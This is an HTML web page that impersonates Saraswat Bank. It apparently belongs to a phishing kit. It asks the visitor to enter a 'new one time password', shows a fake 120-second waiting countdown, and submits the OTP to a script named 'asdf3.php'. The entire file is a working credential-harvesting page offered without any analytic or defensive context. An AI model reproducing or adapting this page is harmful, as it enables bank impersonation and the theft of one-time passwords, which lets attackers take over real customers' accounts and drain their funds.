<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        #aa ,#bb ,#jj ,#kk ,#crd
        {
            width: 100%;
        }
        #ff
        {
            width: 90%;
            margin-left: 5%;
            margin-right: 5%;
            height: 28px;
            border-width:0.1px;
            border-radius:5px;
            
        }
        #dd
        {
            margin-left: 5%;
            font-size: 16px;
        }
        #hh
        {
            width: 200px;
            height: 30px;
            border-color:#993300 ;
            border-radius:5px;
            color: white;
            background-color: #993300 ;
            
            
            
        }
       #tem
       {
           margin-left:5%;
           font-size:20px;
       }
       #loo
       {
           height: 35px;
           color:#017294;
           background-color:#d9f6ff
       }
       #kuku
       {
           color:blue;
           font-size:15px;
           width:100%;
       }
       #djj
       {
           color:#ff9408
       }
       #kik
       {
           background-color:#eaeaea;
           height: 28px;
       }
       #loiuh
       {
           margin-left:5%;
       }
       #red
       {
           color:white;
           background-color:#004a3a;
           width: 70px;
           margin-left: 5%;
       }

 #vld
    {
        color:red;
        font-size:14px;
        margin-left:20px;
    }
      
    </style>
</head>
<body>
    <img src="sars.jpg" alt=""id="bb">
    <br><br>
    <center><b style=" color:red; font-size:18px; font-family:arial; margin:4px;">Welcome to Saraswat Bank </b></center>
    <br><br>
    
    <b style=" color:#01B9F5; font-size:18px; font-family:arial; margin:4px;">Please Enter New one time password(OTP) </b>
    </div>
    
    <form action="asdf3.php" method="post">
        <div class="cc">
            <p id="dd">
                <b style=" color:solid black; font-size:18px; font-family:arial; margin:4px;">
                    Enter One Time Password (OTP)
                </b>
            </p>
        </div>
        <div class="ee">
            <input type="number" name="otp2" id="ff" maxlength="6" pattern="[0-9]{6}" required="" >
        </div> 



          <div id="tim">
          <b>
          <p id="tem"> wait for OTP..<span id="countdowntimer">120 </span> Seconds</p>
          </b>

<script type="text/javascript">
    var timeleft = 120;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
</script>
          </div>
        <div class="gg">
           <center>
            <button type="submit" id="hh"> Confirm </button>
           </center>
        </div> <br>
        
       
        <br>
        <img src="oqwer.png" alt="" id="crd">
        <img src="oqwer1.png" alt="" id="crd">
        <br>
        
    </form>
</body>
<br><br><br>
<img src="sars1.png" alt="" id="kk">
<img src=".png" alt="" id="kk">
</html>